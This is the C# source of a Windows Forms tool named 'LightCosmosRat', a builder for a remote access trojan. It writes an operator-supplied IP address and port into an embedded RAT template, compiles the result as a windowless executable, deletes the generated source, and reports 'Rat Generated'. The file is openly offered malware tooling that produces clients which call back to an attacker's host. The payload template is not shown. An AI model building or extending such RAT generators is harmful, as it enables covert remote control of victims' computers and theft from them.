using System;
using System.Drawing;
using System.Windows.Forms;
using System.Resources;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.IO;
using System.CodeDom.Compiler;
using System.Globalization;
using System.Threading;
namespace LightCosmosRat
{
	/// <summary>
	/// Description of Form1.
	/// </summary>
	public partial class Form1 : Form
	{
        private StringBuilder sb;
		public Form1()
		{
			//
			// The InitializeComponent() call is required for Windows Forms designer support.
			//
			InitializeComponent();

            //
            // TODO: Add constructor code after the InitializeComponent() call.
            //
            //CodeToGenerate = Properties.Resources.esempio;
		}
        public static bool CompileExecutable(String sourceName, TextBox tb)
        {
            FileInfo sourceFile = new FileInfo(sourceName);
            CodeDomProvider provider = null;
            bool compileOk = false;

            // Select the code provider based on the input file extension.
            if (sourceFile.Extension.ToUpper(CultureInfo.InvariantCulture) == ".CS")
            {
                provider = CodeDomProvider.CreateProvider("CSharp");
            }
            else if (sourceFile.Extension.ToUpper(CultureInfo.InvariantCulture) == ".VB")
            {
                provider = CodeDomProvider.CreateProvider("VisualBasic");
            }
            else
            {
                MessageBox.Show("Source file must have a .cs or .vb extension");
            }

            if (provider != null)
            {

                // Format the executable file name.
                // Build the output assembly path using the current directory
                // and <source>_cs.exe or <source>_vb.exe.

                String exeName = String.Format(@"{0}\{1}.exe",
                    System.Environment.CurrentDirectory,
                    sourceFile.Name.Replace(".", "_"));

                CompilerParameters cp = new CompilerParameters(new[] { "mscorlib.dll", "System.dll", "" });

                // Generate an executable instead of 
                // a class library.
                cp.ReferencedAssemblies.Add("System.Core.Dll");
                cp.ReferencedAssemblies.Add("System.Xml.Dll");
                cp.ReferencedAssemblies.Add("System.Xml.Linq.Dll");
                cp.ReferencedAssemblies.Add("Microsoft.CSharp.Dll");
                cp.ReferencedAssemblies.Add("System.Threading.Dll");
                cp.ReferencedAssemblies.Add("System.Data.Dll");
                cp.ReferencedAssemblies.Add("System.Data.DataSetExtensions.Dll");
                cp.ReferencedAssemblies.Add("System.dll");
                cp.ReferencedAssemblies.Add("System.Drawing.Dll");
                cp.ReferencedAssemblies.Add("System.Windows.Forms.Dll");
                cp.CompilerOptions = "/t:winexe";
                cp.GenerateExecutable = true;

                // Specify the assembly file name to generate.
                cp.OutputAssembly = tb.Text + ".exe";

                // Save the assembly as a physical file.
                cp.GenerateInMemory = false;

                // Set whether to treat all warnings as errors.
                cp.TreatWarningsAsErrors = false;

                // Invoke compilation of the source file.
                CompilerResults cr = provider.CompileAssemblyFromFile(cp,
                    sourceName);

                if (cr.Errors.Count > 0)
                {
                    // Display compilation errors.
                    Console.WriteLine("Errors building {0} into {1}",
                        sourceName, cr.PathToAssembly);
                    foreach (CompilerError ce in cr.Errors)
                    {
                        MessageBox.Show(ce.ErrorText);
                    }
                }
                else
                {
                    // Display a successful compilation message.
                    Console.WriteLine("Source {0} built into {1} successfully.",
                        sourceName, cr.PathToAssembly);
                }

                // Return the results of the compilation.
                if (cr.Errors.Count > 0)
                {
                    compileOk = false;
                }
                else
                {
                    compileOk = true;
                }
            }
            return compileOk;
        }
        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                IPAddress.Parse(textBox2.Text);
            }catch(FormatException fe)
            {
                MessageBox.Show(fe.Message);
                return;
            }
            string myCodePrototype = Properties.Resources.RatCode;
            sb = new StringBuilder(myCodePrototype);
            sb.Replace("STD_PORT", textBox1.Text);
            sb.Replace("STD_IP", textBox2.Text);
            string myCode = sb.ToString();
            File.WriteAllText("ClientRat.cs", myCode);
            bool CompilerResults = CompileExecutable("ClientRat.cs",textBox3);
            Thread.Sleep(1000);
            File.Delete("ClientRat.cs");
            if (CompilerResults)
            {
                MessageBox.Show("Rat Generated");
            }
            else
            {
                MessageBox.Show("Error");
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            string InstructionMessage = "Do not modify rat name, after creation! It won't work properly! Do not add extensions to the name";
            MessageBox.Show(InstructionMessage,"Instructions",MessageBoxButtons.OK,MessageBoxIcon.Warning);
        }
    }
}
